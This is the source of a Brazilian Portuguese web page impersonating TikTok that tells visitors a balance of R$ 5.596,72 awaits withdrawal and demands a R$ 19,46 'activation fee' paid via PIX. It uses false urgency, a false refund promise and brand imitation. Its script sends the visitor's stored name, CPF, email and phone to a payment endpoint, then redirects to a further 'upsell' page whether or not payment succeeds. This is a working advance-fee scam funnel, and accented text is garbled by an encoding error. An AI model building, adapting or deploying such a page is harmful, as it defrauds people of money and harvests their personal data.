<!DOCTYPE html>
<html lang="pt-br">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TikTok - Saque Liberado</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');

    body {
      font-family: 'Inter', sans-serif;
      background-color: #FFFFFF;
      color: #161823;
    }

    .progress-bar {
      animation: fill 3s cubic-bezier(0.65, 0, 0.35, 1) forwards;
      background: #FE2C55;
    }

    @keyframes fill {
      from {
        width: 0%;
      }

      to {
        width: 97%;
      }
    }

    .success-icon {
      box-shadow: 0 0 0 0 rgba(105, 201, 208, 0.4);
      animation: pulse-tiktok 2s infinite;
    }

    @keyframes pulse-tiktok {
      0% {
        box-shadow: 0 0 0 0 rgba(105, 201, 208, 0.4);
      }

      70% {
        box-shadow: 0 0 0 15px rgba(238, 29, 82, 0);
      }

      100% {
        box-shadow: 0 0 0 0 rgba(238, 29, 82, 0);
      }
    }

    .btn-tiktok {
      background-color: #FE2C55;
      transition: all 0.2s ease;
    }

    .btn-tiktok:active {
      transform: scale(0.96);
      opacity: 0.9;
    }

    /* Ajuste de Nitidez para a Logo */
    .logo-sharp {
      filter: contrast(1.1) brightness(1.05);
      image-rendering: -webkit-optimize-contrast;
    }

    details summary::-webkit-details-marker {
      display: none;
    }
  </style>
</head>

<body class="antialiased">

  <div
    class="bg-black text-white text-center py-2 px-4 text-[10px] font-bold uppercase tracking-tight w-full sticky top-0 z-50">
    Caso o pagamento da taxa n√£o seja efetuado, o b√¥nus ser√° doado e a vaga ser√° automaticamente perdida.
  </div>

  <div id="upsellScreen">
    <div class="max-w-md mx-auto min-h-screen pb-12 bg-white">

      <div class="px-6 pt-10 pb-8 flex flex-col items-center border-b border-gray-50 bg-white">
        <img src="https://images.seeklogo.com/logo-png/37/2/tiktok-app-logo-png_seeklogo-375617.png" alt="TikTok Logo"
          class="h-28 w-28 object-contain mb-6 logo-sharp drop-shadow-sm">

        <div class="text-center">
          <p class="text-[11px] font-bold text-gray-400 uppercase tracking-[0.2em] mb-1">Saldo Total Dispon√≠vel</p>
          <h2 class="text-5xl font-[900] text-[#161823] tracking-tighter">R$ 5.596,72</h2>
        </div>
      </div>

      <div class="px-6 py-8">

        <div class="text-center mb-8">
          <div class="relative inline-flex mb-6">
            <div
              class="success-icon w-20 h-20 bg-white border-4 border-[#161823] rounded-full flex items-center justify-center relative z-10">
              <svg class="w-10 h-10 text-[#25F4EE]" fill="none" stroke="currentColor" viewBox="0 0 24 24"
                style="filter: drop-shadow(2px 0px 0px #FE2C55);">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M5 13l4 4L19 7"></path>
              </svg>
            </div>
            <div class="absolute -top-1 -left-1 w-20 h-20 bg-[#FE2C55] rounded-full opacity-20"></div>
            <div class="absolute -bottom-1 -right-1 w-20 h-20 bg-[#25F4EE] rounded-full opacity-20"></div>
          </div>

          <h1 class="text-2xl font-black mb-2 italic">PARAB√âNS!</h1>
          <p class="text-gray-500 text-sm leading-relaxed px-4">
            Sua conta foi aprovada para saque imediato. O valor de <strong>R$ 5.596,72</strong> ser√° enviado via PIX.
          </p>
        </div>

        <div class="mb-10">
          <div class="w-full bg-gray-100 h-2 rounded-full overflow-hidden mb-2">
            <div class="progress-bar h-full"></div>
          </div>
          <div class="flex justify-between items-center">
            <p class="text-[10px] font-bold text-[#FE2C55] uppercase tracking-wider">Aguardando Libera√ß√£o</p>
            <p class="text-[10px] font-bold text-gray-400 uppercase">97%</p>
          </div>
        </div>

        <div class="space-y-4">
          <div class="bg-gray-50 rounded-2xl p-6 border border-gray-100">
            <p class="text-[14px] text-gray-700 leading-relaxed text-center">
              Para liberar o saque e ativar sua conta permanentemente, realize o pagamento da <strong>Taxa √önica de
                Ativa√ß√£o</strong> de <span class="text-black font-black text-lg" id="price">R$ 19,46</span>.
            </p>
          </div>

          <a onclick="initiateCheckout(event)"
            class="btn-tiktok block w-full text-white text-center font-[900] py-5 rounded-full text-xl shadow-2xl uppercase tracking-wider">
            LIBERAR MEU SAQUE
          </a>

          <p class="text-center text-[11px] text-gray-400 font-medium">
            * O valor da taxa √© reembolsado no ato do saque.
          </p>

          <div class="mt-8 p-6 bg-black rounded-[2rem] relative overflow-hidden shadow-xl">
            <div class="absolute top-0 right-0 p-3">
              <span
                class="bg-[#FE2C55] text-white text-[9px] font-black px-2 py-1 rounded-md uppercase tracking-widest">URGENTE</span>
            </div>
            <p class="text-gray-400 text-[11px] uppercase font-bold mb-1 tracking-widest">Voc√™ receber√° no PIX:</p>
            <p class="text-4xl font-black text-white tracking-tighter"> R$ 5.596,72 + B√¥nus
            </p>
            <div class="mt-4 flex items-center gap-2">
              <div class="w-2 h-2 bg-[#25F4EE] rounded-full animate-pulse shadow-[0_0_8px_#25F4EE]"></div>
              <span class="text-[#25F4EE] text-[10px] font-black uppercase tracking-[0.1em]">Pronto para
                transfer√™ncia</span>
            </div>
          </div>
        </div>

        <div class="mt-10 space-y-2">
          <details class="group bg-white rounded-xl border border-gray-100 shadow-sm">
            <summary
              class="flex justify-between items-center p-4 cursor-pointer font-bold text-[13px] text-gray-800 uppercase tracking-tight">
              Por que existe essa taxa?
              <span class="text-[#FE2C55] transition-transform group-open:rotate-45 text-xl">+</span>
            </summary>
            <div class="px-4 pb-4 text-[13px] text-gray-500 leading-relaxed">
              A taxa de ativa√ß√£o serve para autenticar sua chave PIX e garantir que os fundos sejam enviados para o
              titular correto da conta TikTok.
            </div>
          </details>
        </div>
      </div>

      <footer class="py-12 text-center">
        <p class="text-[10px] text-gray-300 font-bold uppercase tracking-[0.4em]">TikTok Financial ¬© 2026</p>
      </footer>
    </div>
  </div>
  <!-- QR Code -->
  <div id="qrcodeSection" class="hidden" style="padding: 0 16px;">
    <div class="px-6 pt-10 pb-8 flex flex-col items-center border-b border-gray-50 bg-white">
      <img src="https://i.postimg.cc/XYwkPWhz/imagem-2026-01-02-213823889.png" alt="TikTok Logo"
        class="h-28 w-28 object-contain mb-6 logo-sharp drop-shadow-sm" />
      <div class="text-center">
        <p class="text-[11px] font-bold text-gray-400 uppercase tracking-[0.2em] mb-1">
          Valor do Pagamento
        </p>
        <h2 class="text-5xl font-[900] text-[#161823] tracking-tighter" id="paymentValue">
          R$ 0,00
        </h2>
      </div>
    </div>
    <div class="text-center mb-6">
      <h3 class="text-2xl font-black mb-2 text-gray-900">
        Escaneie o QR Code
      </h3>
      <p class="text-gray-500 text-sm">Ou copie o c√≥digo PIX abaixo</p>
    </div>
    <div
      class="bg-gradient-to-br from-gray-50 to-white border-2 border-gray-200 rounded-2xl p-6 mb-6 flex justify-center shadow-inner">
      <img id="qrCodeImage" src="#" alt="QR Code PIX" class="max-w-full rounded-lg" />
    </div>
    <div class="mb-6">
      <label class="block text-sm font-bold text-gray-700 mb-3">C√≥digo PIX (Copiar e Colar)</label>
      <div class="flex gap-2">
        <input type="text" id="pixCode" readonly
          class="flex-1 p-4 rounded-xl border-2 border-gray-200 bg-gray-50 text-xs font-mono" />
        <button
          class="btn-tiktok px-6 py-4 rounded-xl text-white font-bold uppercase text-xs shadow-lg hover:opacity-90 transition-all"
          id="copy-pix-button">
          COPIAR
        </button>
      </div>
    </div>

    <!-- Instru√ß√µes de Pagamento PIX -->
    <div class="bg-gradient-to-r from-emerald-50 to-teal-50 rounded-2xl p-5 mb-6 border border-emerald-200">
      <h4 class="text-base font-black text-emerald-800 mb-4 flex items-center gap-2">
        <span class="text-xl">üì±</span> Como pagar com PIX
      </h4>
      <div class="space-y-3">
        <div class="flex items-start gap-3">
          <div class="w-7 h-7 bg-emerald-500 rounded-full flex items-center justify-center flex-shrink-0">
            <span class="text-white text-xs font-bold">1</span>
          </div>
          <p class="text-sm text-gray-700">
            Abra o <strong>app do seu banco</strong> no celular
          </p>
        </div>
        <div class="flex items-start gap-3">
          <div class="w-7 h-7 bg-emerald-500 rounded-full flex items-center justify-center flex-shrink-0">
            <span class="text-white text-xs font-bold">2</span>
          </div>
          <p class="text-sm text-gray-700">
            Escolha pagar com <strong>PIX</strong> e selecione
            <strong>"Copia e Cola"</strong> ou <strong>"QR Code"</strong>
          </p>
        </div>
        <div class="flex items-start gap-3">
          <div class="w-7 h-7 bg-emerald-500 rounded-full flex items-center justify-center flex-shrink-0">
            <span class="text-white text-xs font-bold">3</span>
          </div>
          <p class="text-sm text-gray-700">
            <strong>Cole o c√≥digo</strong> copiado ou
            <strong>escaneie o QR Code</strong> acima
          </p>
        </div>
        <div class="flex items-start gap-3">
          <div class="w-7 h-7 bg-emerald-500 rounded-full flex items-center justify-center flex-shrink-0">
            <span class="text-white text-xs font-bold">4</span>
          </div>
          <p class="text-sm text-gray-700">
            Confirme o pagamento e <strong>aguarde a confirma√ß√£o</strong>
          </p>
        </div>
      </div>
    </div>

    <div class="bg-blue-50 border-l-4 border-blue-500 p-4 rounded-r-lg mb-4">
      <p class="text-sm text-gray-700">
        <strong class="text-blue-700">Aguardando pagamento...</strong><br />
        <span class="text-gray-600">O status ser√° atualizado automaticamente.</span>
      </p>
    </div>
    <div id="paymentStatus" class="text-center text-sm font-bold text-gray-600 mb-4">
      Status: Aguardando pagamento
    </div>
  </div>
  </div>

  <!-- Sucesso -->
  <div id="successSection" class="hidden px-6 py-8">
    <div class="text-center">
      <div class="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6">
        <svg class="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path>
        </svg>
      </div>
      <h3 class="text-2xl font-black mb-2 text-green-600">
        Pagamento Confirmado!
      </h3>
      <p class="text-gray-600 mb-6">Seu saque ser√° liberado em breve.</p>
    </div>
  </div>
  </div>

  <script>
    const urlParams = new URLSearchParams(window.location.search);
    const upsellId = urlParams.get("upsell") || "up1";

    let transactionId = null;
    let checkInterval = null;
    let isGeneratingPix = false;
  </script>
</body>

<script>
  const confirmBtn = document.getElementById("btn-confirmar");
  const clientRawData = localStorage.getItem("checkout_personal_data");
  const clientData = clientRawData ? JSON.parse(clientRawData) : {};
  const pixPaymentScreen = document.getElementById("pix-payment-screen");
  const pixScreenBackButton = document.getElementById(
    "pix-screen-back-button"
  );
  const pixLoadingState = document.getElementById("pix-loading");
  const pixDetails = document.getElementById("pix-details");
  const pollingMessageEl = document.getElementById("polling-message");
  const copyFeedback = document.getElementById("copy-feedback");
  const pixSubtotal = document.getElementById("pix-subtotal");
  const pixTotal = document.getElementById("pix-total");

  const pixLoadingScreen = document.getElementById("loading");
  const pixQrCodeScreen = document.getElementById("qrcodeSection");
  const pixSuccessScreen = document.getElementById("successSection");
  const qrCodeImage = document.getElementById("qrCodeImage");
  const pixCode = document.getElementById("pixCode");
  const paymentField = document.getElementById("paymentValue");
  const upsellScreen = document.getElementById("upsellScreen");

  let currentUpsellVal = 1946; // Valor padrao em centavos

  const pathParts = window.location.pathname.split('/').filter(Boolean);
  const baseFolder = pathParts[0];

  const price = document.getElementById("price");
  async function fetchUpsellValue() {
    try {
      const urlParams = new URLSearchParams(window.location.search);
      const uId = urlParams.get("upsell") || "up1";
      const req = await fetch(`/${baseFolder}/get-upsell-value.php?upsell=${uId}`);
      const res = await req.json();
      if (res.success) {
        currentUpsellVal = Math.round(res.value * 100);
        price.textContent = formatPrice(currentUpsellVal / 100);
      }
    } catch (e) {
      console.error("Erro ao buscar valor do upsell", e);
    }
  }

  fetchUpsellValue();


  console.log(clientData);

  function showPopUp() {
    const overlay = document.getElementById("overlay");
    const popup = document.getElementById("popup");
    overlay.style.display = "block";
    popup.style.display = "block";
  }

  function formatPrice(price) {
    return `R$ ${parseFloat(price).toFixed(2).replace(".", ",")}`;
  }

  // Setup listeners
  document.addEventListener("DOMContentLoaded", () => {
    const copyBtn = document.getElementById("pix-copy-btn");
    if (copyBtn) {
      copyBtn.addEventListener("click", () => {
        const copyText = document.getElementById("pix-code-input");
        copyText.select();
        copyText.setSelectionRange(0, 99999);
        if (navigator.clipboard) {
          navigator.clipboard
            .writeText(copyText.value)
            .then(() => {
              const originalText = copyBtn.textContent;
              copyBtn.textContent = "Copiado!";
              setTimeout(() => (copyBtn.textContent = originalText), 2000);
            })
            .catch((err) => {
              console.error("Erro ao copiar", err);
            });
        } else {
          document.execCommand("copy");
          const originalText = copyBtn.textContent;
          copyBtn.textContent = "Copiado!";
          setTimeout(() => (copyBtn.textContent = originalText), 2000);
        }
      });
    }

    const manualBtn = document.getElementById("pix-confirm-manual-btn");
    if (manualBtn) {
      manualBtn.addEventListener("click", () => {
        if (typeof Swal !== "undefined") {
          Swal.fire({
            title: "Verificando...",
            text: "Aguarde um momento.",
            timer: 2000,
            showConfirmButton: false,
          });
        } else {
          alert("Verificando pagamento...");
        }
      });
    }
  });

  function showError(msg) {
    if (typeof Swal !== "undefined") {
      Swal.fire({
        title: "Erro",
        text: msg,
        icon: "error",
        confirmButtonText: "OK",
      });
    } else {
      alert(msg);
    }
  }

  let pollingInterval;
  let pollingAttempts = 0;
  const MAX_POLLING_ATTEMPTS = 60;

  const transactionInfoRaw = localStorage.getItem("frontPaymentResponse");
  const transactionInfo = JSON.parse(transactionInfoRaw);

  async function initiateCheckout(event) {
    event.preventDefault();
    const btn = document.getElementById("confirmation-button");
    if (btn) btn.innerText = "Gerando PIX...";

    const clientRawData = localStorage.getItem("clientData");
    const clientData = JSON.parse(clientRawData);

    try {
      const name = clientData.nome
        ? clientData.nome.trim()
        : gerarNomeAleatorio();
      const document = clientData.document;
      const email = clientData.email;
      const phone = clientData.phone;

      const formData = new FormData();
      formData.append("priceInCents", currentUpsellVal);
      formData.append("email", email);
      formData.append(
        "name",
        name
      );
      formData.append("document", document);
      formData.append("phone", phone);

      const urlParams = new URLSearchParams(window.location.search);

      const utmData = {
        utm_source:
          urlParams.get("utm_source") ||
          localStorage.getItem("utm_source") ||
          "",
        utm_medium:
          urlParams.get("utm_medium") ||
          localStorage.getItem("utm_medium") ||
          "",
        utm_campaign:
          urlParams.get("utm_campaign") ||
          localStorage.getItem("utm_campaign") ||
          "",
        utm_content:
          urlParams.get("utm_content") ||
          localStorage.getItem("utm_content") ||
          "",
        utm_term:
          urlParams.get("utm_term") ||
          localStorage.getItem("utm_term") ||
          "",
        xcod: urlParams.get("xcod") || localStorage.getItem("xcod") || "",
        sck: urlParams.get("sck") || localStorage.getItem("sck") || "",
      };

      Object.entries(utmData).forEach(([key, value]) => {
        formData.append(key, value);
      });

      const response = await fetch(`/${baseFolder}/pagamento.php`, {
        method: "POST",
        body: formData,
      });
      const responseData = await response.json();

      if (responseData.success) {
        upsellScreen.style.display = "none";
        pixQrCodeScreen.classList.remove("hidden");
        qrCodeImage.src = responseData.qrCodeUrl;
        pixCode.value = responseData.pixCode;
        paymentField.textContent = formatPrice(currentUpsellVal / 100);
        startPaymentPolling(responseData.token);
      }
    } catch (error) {
      console.error("Erro ao gerar PIX:", error);
    }
  }

  async function startPaymentPolling(transactionToken) {
    if (pollingInterval) clearInterval(pollingInterval);
    pollingAttempts = 0;

    pollingInterval = setInterval(async () => {
      pollingAttempts++;
      if (pollingAttempts > MAX_POLLING_ATTEMPTS) {
        clearInterval(pollingInterval);
        return;
      }

      try {
        const response = await fetch(`/${baseFolder}/verificar.php?id=${transactionToken}`);
        if (!response.ok) return;

        const result = await response.json();

        console.log(result.status);

        if (result.data.mangofy_data.data.payment_status === 'approved') {
          clearInterval(pollingInterval);
          pixQrCodeScreen.classList.add("hidden");
          pixSuccessScreen.classList.remove("hidden");

          setTimeout(() => {
            window.location.href = `/${baseFolder}/upsell2.html${window.location.search}`;
          }, 2000);


        } else {
          setTimeout(() => {
            window.location.href = `/${baseFolder}/upsell2.html${window.location.search}`;
          }, 2000);
        }
      } catch (error) {
        console.error("Polling error", error);
      }
    }, 5000);
  }

  function hidePixScreen() {
    pixPaymentScreen.style.display = "none";
    document.body.style.overflow = "auto";
    stopPaymentPolling();
    resetConfirmButton();
  }

  function stopPaymentPolling() {
    if (pollingInterval) {
      clearInterval(pollingInterval);
      pollingInterval = null;
    }
    pollingAttempts = 0;
  }

  function resetConfirmButton() {
    confirmBtn.disabled = false;
    confirmBtn.innerHTML =
      '<i class="fa-solid fa-check"></i> Carregando regulariza√ß√£o...';
  }

  const copyPixButton = document.getElementById("copy-pix-button");
  const pixCodeText = document.getElementById("pixCode");

  copyPixButton.addEventListener("click", function () {
    if (pixCodeText.value) {
      navigator.clipboard
        .writeText(pixCodeText.value.trim())
        .then(() => {
          copyPixButton.textContent = "C√≥digo PIX copiado!";
          setTimeout(() => {
            copyPixButton.textContent = "COPIAR";
          }, 3000);
        })
        .catch(() => {
          copyPixButton.textContent = "Erro ao copiar.";
        });
    }
  });
</script>
</body>

</html>